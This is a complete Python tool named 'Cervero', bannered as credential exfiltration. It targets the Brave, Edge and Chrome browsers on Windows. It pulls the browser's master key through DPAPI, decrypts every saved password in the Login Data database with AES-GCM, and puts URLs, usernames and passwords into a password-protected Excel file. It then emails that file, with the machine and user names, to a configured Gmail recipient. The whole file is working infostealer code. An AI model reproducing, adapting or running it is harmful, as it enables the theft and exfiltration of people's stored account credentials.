import os
import re
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime
from colorama import init, Fore, Style
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from dotenv import load_dotenv
from openpyxl import Workbook, load_workbook
from openpyxl.styles import Font, Alignment, Border, Side, PatternFill
from openpyxl.worksheet.table import Table, TableStyleInfo
import msoffcrypto
import io
import platform
import msvcrt

# Inicializar variables de entorno
load_dotenv()

# Inicializar Colorama
init(autoreset=True)

# Configuración del correo 
EMAIL_CONFIG = {
    'sender_email': os.getenv('EMAIL_USER'),
    'receiver_email': os.getenv('EMAIL_RECEIVER'),
    'password': os.getenv('EMAIL_PASSWORD'),  
    'smtp_server': 'smtp.gmail.com',
    'smtp_port': 587
}

# Rutas de los navegadores
def get_browser_paths(browser):
    user_profile = os.environ['USERPROFILE']
    paths = {
        'Brave': {
            'local_state': os.path.normpath(f"{user_profile}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State"),
            'path': os.path.normpath(f"{user_profile}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data")
        },
        'Edge': {
            'local_state': os.path.normpath(f"{user_profile}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State"),
            'path': os.path.normpath(f"{user_profile}\\AppData\\Local\\Microsoft\\Edge\\User Data")
        },
        'Chrome': {
            'local_state': os.path.normpath(f"{user_profile}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"),
            'path': os.path.normpath(f"{user_profile}\\AppData\\Local\\Google\\Chrome\\User Data")
        }
    }
    return paths.get(browser, {})

def print_banner():
    
    # ASCII Art para Cervero
    cervero_ascii = r"""
    ██████╗███████╗██████╗ ██╗   ██╗███████╗██████╗  ██████╗ 
    ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗██╔═══██╗
    ██║     █████╗  ██████╔╝██║   ██║█████╗  ██████╔╝██║   ██║
    ██║     ██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗██║   ██║
    ╚██████╗███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║╚██████╔╝
     ╚═════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝ ╚═════╝ 
    """
    
    # Información adicional
    subtitle = "Exfiltración de credenciales"
    author = "Creado por Mix Dark"
    date_info = f"Fecha: 08-05-2025"
    version = "Versión: 1.0"
    
    # Línea decorativa
    border = Fore.CYAN + "=" * 70
    
    # Imprimir banner
    #print("\n" + border)
    print(Fore.CYAN + cervero_ascii)
    print(border)
    
    # Información centrada
    print(Fore.GREEN + Style.BRIGHT + subtitle.center(70))
    print(Fore.CYAN + author.center(70))
    print(Fore.CYAN + date_info.center(70))
    print(Fore.CYAN + f"{version}".center(70))
    print(border + "\n")

def is_browser_installed(browser_path_local_state, browser_path):
    return os.path.exists(browser_path_local_state) and os.path.exists(browser_path)

def get_secret_key(browser_path_local_state):
    try:
        with open(browser_path_local_state, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print(Fore.RED + f"[ERR] {str(e)}")
        print(Fore.RED + f"[ERR] {browser_path_local_state} No se pudo encontrar la clave secreta.")
        return None

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        return decrypted_pass.decode()
    except Exception as e:
        print(Fore.RED + f"[ERR] {str(e)}")
        print(Fore.RED + "[ERR] No se puede descifrar, la versión del navegador inferior a la 80 no es compatible.")
        return ""

def get_db_connection(browser_path_login_db):
    try:
        shutil.copy2(browser_path_login_db, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print(Fore.RED + f"[ERR] {str(e)}")
        print(Fore.RED + "[ERR] No se pudo encontrar la base de datos del navegador")
        return None

def send_email(subject, body, attachment_path=None):
    try:
        if not all([EMAIL_CONFIG['sender_email'], EMAIL_CONFIG['password'], EMAIL_CONFIG['receiver_email']]):
            raise ValueError("Configuración de correo incompleta en variables de entorno")

        msg = MIMEMultipart()
        msg['From'] = EMAIL_CONFIG['sender_email']
        msg['To'] = EMAIL_CONFIG['receiver_email']
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain', 'utf-8'))

        if attachment_path and os.path.exists(attachment_path):
            with open(attachment_path, 'rb') as f:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(f.read())
                encoders.encode_base64(part)
                
                safe_filename = os.path.basename(attachment_path)
                part.add_header('Content-Disposition', f'attachment; filename="{safe_filename}"')
                msg.attach(part)

        with smtplib.SMTP(EMAIL_CONFIG['smtp_server'], EMAIL_CONFIG['smtp_port'], timeout=30) as server:
            server.ehlo()
            if EMAIL_CONFIG['smtp_port'] == 587:
                server.starttls()
                server.ehlo()
            
            server.login(EMAIL_CONFIG['sender_email'], EMAIL_CONFIG['password'])
            server.send_message(msg)
        
        return True

    except smtplib.SMTPAuthenticationError as e:
        print(Fore.RED + f"\n[ERROR SMTP] Error de autenticación con el servidor SMTP.")
    except Exception as e:
        print(Fore.RED + f"\n[ERROR INESPERADO] {type(e).__name__}: {str(e)}")
        
    return False

def protect_with_password(file_path, password):
    """Protege un archivo Excel con contraseña"""
    try:
        temp_file = f"{file_path}.tmp"
        
        # Abrir el archivo original
        with open(file_path, 'rb') as f:
            file_data = f.read()
        
        # Crear objeto OfficeFile
        office_file = msoffcrypto.OfficeFile(io.BytesIO(file_data))
        
        # Crear buffer para el archivo encriptado
        encrypted_data = io.BytesIO()
        
        # Encriptar el archivo
        office_file.encrypt(password=password, outfile=encrypted_data)
        
        # Guardar el archivo encriptado
        with open(temp_file, 'wb') as f:
            f.write(encrypted_data.getvalue())
        
        # Reemplazar el archivo original
        os.remove(file_path)
        os.rename(temp_file, file_path)
        
        return True
    except Exception as e:
        print(Fore.RED + f"\n[ERROR al proteger archivo] {str(e)}")
        if 'temp_file' in locals() and os.path.exists(temp_file):
            os.remove(temp_file)
        return False

def create_protected_excel(browser_name, data, password="C3rv3r0"):
    """Crea un archivo Excel protegido con contraseña sin la columna de índice"""
    try:
        # Configurar nombres de archivos
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        temp_filename = f"temp_{browser_name}_{timestamp}.xlsx"
        final_filename = f'credenciales_descifradas_{browser_name}.xlsx'
        
        # Crear libro de trabajo
        wb = Workbook()
        ws = wb.active
        ws.title = "Contraseñas"

        # Estilos para encabezados
        header_style = {
            'font': Font(bold=True, color="FFFFFF"),
            'fill': PatternFill(start_color="4F81BD", end_color="4F81BD", fill_type="solid"),
            'alignment': Alignment(horizontal="center", vertical="center"),
            'border': Border(
                left=Side(style='thin'), 
                right=Side(style='thin'), 
                top=Side(style='thin'), 
                bottom=Side(style='thin'))
        }

        # Escribir encabezados - sin la columna "Índice"
        headers = ["URL del sitio", "Nombre de usuario", "Contraseña descifrada"]
        ws.append(headers)

        # Aplicar estilos
        for col in range(1, len(headers) + 1):
            for attr, value in header_style.items():
                setattr(ws.cell(row=1, column=col), attr, value)

        # Agregar datos - excluyendo el índice
        for row_data in data:
            ws.append(row_data[1:])  # Omitir el primer elemento (índice)

        # Aplicar formato si hay datos
        if data:
            # Ajustar anchos de columna
            ws.column_dimensions['A'].width = 50  # URL
            ws.column_dimensions['B'].width = 30  # Usuario
            ws.column_dimensions['C'].width = 30  # Contraseña

            # Estilo para datos
            for row in ws.iter_rows(min_row=2, max_row=ws.max_row):
                for cell in row:
                    cell.alignment = Alignment(horizontal="left", vertical="center")
                    cell.border = Border(
                        left=Side(style='thin'), 
                        right=Side(style='thin'), 
                        top=Side(style='thin'), 
                        bottom=Side(style='thin'))

            # Crear tabla (sin filtros pero con encabezados)
            tab = Table(
                displayName="Credenciales", 
                ref=f"A1:C{ws.max_row}"  # Ahora es A1:C en lugar de A1:D
            )
            # Desactivar los filtros
            tab.autoFilter = None
            tab.tableStyleInfo = TableStyleInfo(
                name="TableStyleMedium9",
                showFirstColumn=False,
                showLastColumn=False,
                showRowStripes=True,
                showColumnStripes=False
            )
            ws.add_table(tab)

        # Guardar primero en temporal
        wb.save(temp_filename)
        wb.close()

        # Verificar integridad
        try:
            test_wb = load_workbook(temp_filename)
            test_wb.close()
        except Exception as e:
            raise RuntimeError(f"Archivo corrupto: {str(e)}")

        # Aplicar contraseña
        if not protect_with_password(temp_filename, password):
            raise RuntimeError("Error al proteger con contraseña")

        # Mover a archivo final
        if os.path.exists(final_filename):
            os.remove(final_filename)
        shutil.move(temp_filename, final_filename)
        
        return final_filename

    except Exception as e:
        # Limpieza
        if 'temp_filename' in locals() and os.path.exists(temp_filename):
            os.remove(temp_filename)
        if 'wb' in locals():
            wb.close()
        raise

#Muestra las credenciales en pantalla de forma estructurada sin truncar valores
def display_credentials(browser_name, credentials_data):
    if not credentials_data:
        print(Fore.YELLOW + f"\n[INFO] No se encontraron credenciales para {browser_name}.")
        return

    print(Fore.GREEN + f"\n[INFO] Credenciales encontradas para {browser_name}:")
    print(Fore.CYAN + "=" * 100)
    
    for row in credentials_data:
        idx, url, username, password = row
        print(Fore.CYAN + "=" * 100)
        print(f"{Fore.WHITE}URL: {Fore.CYAN}{url}")
        print(f"{Fore.WHITE}Usuario: {Fore.GREEN}{username}")
        print(f"{Fore.WHITE}Contraseña: {Fore.RED}{password}")
    
    print(Fore.CYAN + "=" * 100)
    print(Fore.GREEN + f"\nTotal de registro: {len(credentials_data)}")

import msvcrt

def process_browser(browser_name):
    try:
        browser_paths = get_browser_paths(browser_name)
        if not browser_paths:
            print(Fore.YELLOW + f"\n[INFO] {browser_name} no está soportado.")
            return

        if not is_browser_installed(browser_paths['local_state'], browser_paths['path']):
            print(Fore.YELLOW + f"\n[INFO] {browser_name} no está instalado.")
            return

        secret_key = get_secret_key(browser_paths['local_state'])
        if not secret_key:
            return

        excel_data = []
        passwords_found = 0

        # Buscar perfiles
        folders = [element for element in os.listdir(browser_paths['path']) 
                 if re.search("^Profile|^Default", element)]
        
        for folder in folders:
            login_db = os.path.join(browser_paths['path'], folder, "Login Data")
            
            if not os.path.exists(login_db):
                continue

            conn = get_db_connection(login_db)
            if not conn:
                continue

            try:
                cursor = conn.cursor()
                cursor.execute(
                    "SELECT action_url, username_value, password_value FROM logins "
                    "WHERE username_value IS NOT NULL AND password_value IS NOT NULL"
                )
                
                for index, (url, username, ciphertext) in enumerate(cursor.fetchall()):
                    if url and username and ciphertext:
                        decrypted = decrypt_password(ciphertext, secret_key)
                        if decrypted:
                            excel_data.append([
                                index + 1,
                                str(url)[:500].strip(),
                                str(username)[:200].strip(),
                                str(decrypted)[:300].strip()
                            ])
                            passwords_found += 1
            finally:
                cursor.close()
                conn.close()
                if os.path.exists("Loginvault.db"):
                    os.remove("Loginvault.db")

        # Mostrar credenciales en pantalla
        display_credentials(browser_name, excel_data)                    

        # Generar Excel si hay datos
        if passwords_found > 0:
            try:
                # Solicitar contraseña para proteger el archivo con asteriscos
                print(Fore.YELLOW + "\nIngrese una contraseña para proteger el archivo (deje vacío para usar 'C3rv3r0'): ", end="", flush=True)
                
                # Implementación para enmascarar la contraseña en Windows
                password = ""
                while True:
                    char = msvcrt.getch()
                    char = char.decode('utf-8') if isinstance(char, bytes) else char
                    if char == '\r' or char == '\n':  # Enter
                        print()
                        break
                    elif char == '\b':  # Backspace
                        if password:
                            password = password[:-1]
                            print('\b \b', end='', flush=True)
                    else:
                        password += char
                        print('*', end='', flush=True)
                
                if not password:
                    password = "C3rv3r0"
                    print(Fore.GREEN + f"\n[INFO] Usando contraseña por defecto: C3rv3r0")
                else:
                    print(Fore.GREEN + f"\n[INFO] Contraseña personalizada establecida correctamente")
                
                excel_file = create_protected_excel(browser_name, excel_data, password)
                
                # Enviar por correo
                email_subject = f"🔐 Credenciales navegador {browser_name}"
                email_body = (
                    f"Se encontraron {passwords_found} registros.\n\n"
                    f"Equipo: {os.environ.get('COMPUTERNAME', 'N/A')}\n"
                    f"Usuario: {os.environ.get('USERNAME', 'N/A')}\n"
                    f"Sistema Operativo: {platform.system()} {platform.release()}\n" 
                    f"Fecha del reporte: {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}"
                )
                
                if send_email(email_subject, email_body, excel_file):
                    print(Fore.GREEN + f"\n[ÉXITO] Reporte enviado al correo electrónico.")
                    os.remove(excel_file)
                else:
                    print(Fore.YELLOW + "\n[ADVERTENCIA] Datos guardados localmente en " + excel_file)
            except Exception as e:
                print(Fore.RED + f"\n[ERROR al generar Excel] {str(e)}")
        else:
            print(Fore.YELLOW + "\n[INFO] No se encontraron credenciales.")

    except Exception as e:
        print(Fore.RED + f"\n[ERROR CRÍTICO] En {browser_name}: {str(e)}")
        if os.path.exists("Loginvault.db"):
            os.remove("Loginvault.db")

def get_browser_choice():
    print("\n" + Fore.MAGENTA + "Navegadores disponibles:")
    print(Fore.CYAN + "1. Brave")
    print(Fore.CYAN + "2. Microsoft Edge")
    print(Fore.CYAN + "3. Google Chrome")
    print(Fore.RED + "4. Salir")
    choice = input(Fore.YELLOW + "\nElige una opción: ")
    return choice.strip()

def main():
    print_banner()
    while True:
        choice = get_browser_choice()
        if choice == "1":
            print("\nProcesando navegador Brave...")
            process_browser("Brave")
        elif choice == "2":
            print("\nProcesando navegador Microsoft Edge...")
            process_browser("Edge")
        elif choice == "3":
            print("\nProcesando navegador Google Chrome...")
            process_browser("Chrome")
        elif choice == "4":
            print("\nSaliendo del programa...")
            break
        else:
            print(Fore.RED + "\nOpción no válida. Intenta de nuevo.")

if __name__ == '__main__':
    main()
